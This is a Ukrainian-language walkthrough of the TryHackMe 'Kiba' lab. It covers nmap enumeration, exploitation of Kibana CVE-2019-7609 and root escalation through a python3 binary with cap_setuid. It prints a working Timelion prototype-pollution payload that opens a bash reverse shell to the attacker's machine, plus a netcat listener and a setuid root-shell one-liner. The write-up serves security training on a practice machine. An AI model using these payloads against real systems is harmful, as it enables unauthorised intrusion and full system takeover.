# Kiba:TryHackMe
## Бажаю здоровья, дорегенькі!@!
Сьогодні ми будемо проходити таку ВФку як Kiba на сайті TryHackMe.\
Посилання на ВФку: https://tryhackme.com/r/room/kiba\
(Перше питання пропустимо, можна і здогадатись, і нагуглити) 

## Енумерація!
Відкривши *Nmap*, ми можемо побачити наступну картину:

```console
root@ip-10-10-244-132:~# nmap -sC -sV --min-rate 10000 10.10.127.121 -p-
Starting Nmap 7.60 ( https://nmap.org ) at 2024-06-06 18:31 BST
Nmap scan report for ip-10-10-127-121.eu-west-1.compute.internal (10.10.127.121)
Host is up (0.0023s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (EdDSA)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequest, DNSVersionBindReq, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Thu, 06 Jun 2024 17:31:25 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Thu, 06 Jun 2024 17:31:25 GMT
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Thu, 06 Jun 2024 17:31:25 GMT
|_    {"statusCode":404,"error":"Not Found"}
```
З цікавого можна побачити 80 порт та 5601. Давайте розберемо детальніше!

На 80 порту в нас веб сторінка, яка дає наступну картину:

<img src="https://i.ibb.co/fpSM0T5/80.png" alt="drawing" width="650"/>\
Єдине, що ми тут можемо побачити, так це таку штуку, як "Linux Capabilities". Що це?

```
Linux capabilities розбивають привілеї root на менші, відокремлені
одиниці, що дозволяє процесам мати підмножину привілеїв. Це мінімізує ризики,
не надаючи повних привілеїв root, де це непотрібно.
```
Нє, ну кайф звісно, а нафіга воно нам? Хоча, може, потім знадобиться...

**Dirbuster** нічого не знайшов, тому є сенс переходити до порту 5601.

<img src="https://i.ibb.co/Sv0LGDd/5601.png" alt="drawing" width="650"/>

О О О! А це вже шось цікаве! Це ж Кібана!
```
Kibana – це інструмент візуального інтерфейсу, який дозволяє досліджувати,
візуалізувати та створювати інформаційну панель над даними журналу, 
зібраними у кластерах Elasticsearch. 
```
У вкладці `Management` можна знайти версію, яку треба ввести у питання TryHackMe - `6.5.4`.

Знаючи версію Кібана можна пошукати, чи є на неї якісь вразливості.
Так! Просто пошукавши в інтернеті, ми знаходимо репозитрію у гітхабі з усім необхідним.
https://github.com/mpgn/CVE-2019-7609

Відповідаємо на питання з приводу вразливості застосунку - `CVE-2019-7609`.

## Ламаємо!
Заздалегідь відкриваємо слушалку на NetCat:
```shell
nc -lvnp 6666
```
Першим ділом запускаємо 
Заходимо у вкладку `Timeleon`, де вставляємо у візуалізатор наступний код(не забудьте вставити там свій айпішнік):
```console
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/<IP Атакуючої Машини>/6666 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
Після чого нажимаємо **Run**, чекаємо поки догрузить і клікаємо на `Canvas`, все показано на скріні нижче:\
<img src="https://i.ibb.co/yP5fShc/image.png" alt="drawing" width="650"/>\
Може не з першого разу вийти. Я кілька разів перезапускав машину:( 

І ось, ми отримуємо доступ до консолі!

```
kiba@ubuntu:/home/kiba/kibana/bin$ 
```

Тут же ми і читаємо `user.txt`:
```console
kiba@ubuntu:/home/kiba/kibana/bin$ cd ../..
kiba@ubuntu:/home/kiba$ ls
elasticsearch-6.5.4.deb
kibana
user.txt
kiba@ubuntu:/home/kiba$ cat user.txt
Тут типу флаг
```

# Добираємося до РУТА!
Згадавши те, що на сторінці порта 80 згадувалися `Linux Capabilities`, я вирішив їх перевірити наступною командою(Її, до речі, треба ввести у питання TryHackMe):
```
getcap -r /
``` 
Дуже багато різного проноситься перед очима, але що ми бачимо в кінці!
```shell
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```

На `GTFOBins` ми можемо знайти команду, яка нам дає root за допомогою `Capabilities`. Переробляємо її під нас і запускаємо:
```
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
Отримуємо рута, отримуємо флаг!

```
whoami 
root
id
uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
cat /root/root.txt
Тут типу флаг
```

### Дякую за увагу, гарного настрою!

<img src="https://c.tenor.com/H58mOAfpDUwAAAAC/tenor.gif" alt="drawing" width="250"/>